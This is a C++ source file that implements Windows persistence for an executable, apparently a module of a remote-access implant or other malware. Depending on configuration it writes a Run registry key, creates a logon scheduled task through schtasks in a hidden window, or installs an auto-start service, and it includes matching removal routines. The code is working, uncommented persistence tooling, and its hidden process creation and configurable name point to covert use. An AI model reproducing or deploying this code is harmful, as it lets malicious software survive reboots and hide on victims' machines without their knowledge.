#include "persistence.h"
#include "config.h"

#include <windows.h>
#include <winreg.h>
#include <winsvc.h>
#include <string>

#pragma comment(lib, "advapi32.lib")

namespace pers {

static bool RunKeyInstall(const std::string& exe) {
    HKEY key = nullptr;
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS)
        return false;

    std::wstring wname(cfg::kPersistName, cfg::kPersistName + strlen(cfg::kPersistName));
    std::wstring wexe(exe.begin(), exe.end());
    wexe = L"\"" + wexe + L"\"";

    LONG rc = RegSetValueExW(key, wname.c_str(), 0, REG_SZ,
                             (const BYTE*)wexe.c_str(),
                             DWORD((wexe.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
    return rc == ERROR_SUCCESS;
}

static bool RunKeyRemove() {
    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &key) != ERROR_SUCCESS)
        return false;
    std::wstring wname(cfg::kPersistName, cfg::kPersistName + strlen(cfg::kPersistName));
    LONG rc = RegDeleteValueW(key, wname.c_str());
    RegCloseKey(key);
    return rc == ERROR_SUCCESS;
}

static bool TaskInstall(const std::string& exe) {
    std::string cmd = "schtasks /create /tn \"" + std::string(cfg::kPersistName) +
                      "\" /tr \"\\\"" + exe + "\\\"\" /sc onlogon /f /rl limited";
    STARTUPINFOA si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::string mut = cmd;
    if (!CreateProcessA(nullptr, &mut[0], nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return code == 0;
}

static bool TaskRemove() {
    std::string cmd = "schtasks /delete /tn \"" + std::string(cfg::kPersistName) + "\" /f";
    STARTUPINFOA si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::string mut = cmd;
    if (!CreateProcessA(nullptr, &mut[0], nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return code == 0;
}

static bool ServiceInstall(const std::string& exe) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    std::wstring wname(cfg::kPersistName, cfg::kPersistName + strlen(cfg::kPersistName));
    std::wstring wexe(exe.begin(), exe.end());

    SC_HANDLE svc = CreateServiceW(scm, wname.c_str(), wname.c_str(),
                                   SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                   SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                                   wexe.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
    bool ok = false;
    if (svc) { ok = StartServiceW(svc, 0, nullptr) != 0; CloseServiceHandle(svc); }
    CloseServiceHandle(scm);
    return ok;
}

static bool ServiceRemove() {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    std::wstring wname(cfg::kPersistName, cfg::kPersistName + strlen(cfg::kPersistName));
    SC_HANDLE svc = OpenServiceW(scm, wname.c_str(), DELETE | SERVICE_STOP);
    if (!svc) { CloseServiceHandle(scm); return false; }
    SERVICE_STATUS st{};
    ControlService(svc, SERVICE_CONTROL_STOP, &st);
    bool ok = DeleteService(svc) != 0;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

bool Install(const std::string& exe_path) {
    switch (cfg::kPersist) {
        case cfg::Persist::RunKey:        return RunKeyInstall(exe_path);
        case cfg::Persist::ScheduledTask: return TaskInstall(exe_path);
        case cfg::Persist::Service:       return ServiceInstall(exe_path);
        default: return false;
    }
}

bool Remove() {
    switch (cfg::kPersist) {
        case cfg::Persist::RunKey:        return RunKeyRemove();
        case cfg::Persist::ScheduledTask: return TaskRemove();
        case cfg::Persist::Service:       return ServiceRemove();
        default: return false;
    }
}

}